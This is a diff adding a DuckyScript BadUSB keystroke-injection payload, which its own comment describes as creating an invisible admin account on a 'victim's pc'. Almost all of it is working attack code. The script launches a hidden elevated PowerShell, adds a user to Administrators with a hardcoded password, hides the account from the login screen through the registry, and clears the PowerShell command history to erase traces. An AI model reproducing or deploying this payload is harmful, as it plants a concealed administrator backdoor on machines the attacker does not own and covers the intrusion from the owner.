@@ -1,0 +1,52 @@
+REM This script allows you to create an invisible admin account in your victim's pc
+LOCALE FR
+DELAY 2500
+REM Minimize all apps
+GUI d
+DELAY 200
+REM Start powershell as admin
+GUI r
+DELAY 200
+STRING powershell.exe -windowstyle hidden
+DELAY 150
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 150
+ENTER
+DELAY 2000
+REM Create a new user
+STRING net user secret thor /add
+ENTER
+REM Add this user to the localgroup "Administrators"
+STRING net localgroup Administrators secret /add
+ENTER
+REM Make this user invisible
+STRING reg add 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Windows NT\CurrentVersion\Winlogon\SpecialAccountsUserlist' /v secret /t REG_DWORD /d 0 /f
+ENTER
+REM Set interactive logon on : Don't display last signed-in to allow you to connect to invisible account
+STRING Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'dontdisplaylastusername' -value '1'
+ENTER
+REM Clear powershell command history
+STRING Clear-Content (Get-PSReadlineOption).HistorySavePath
+ENTER
+REM Exit from powershell
+STRING exit
+ENTER
+REM Make capslock flash to know when you can unplug the BadUSB
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 2000
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+REM End of payload
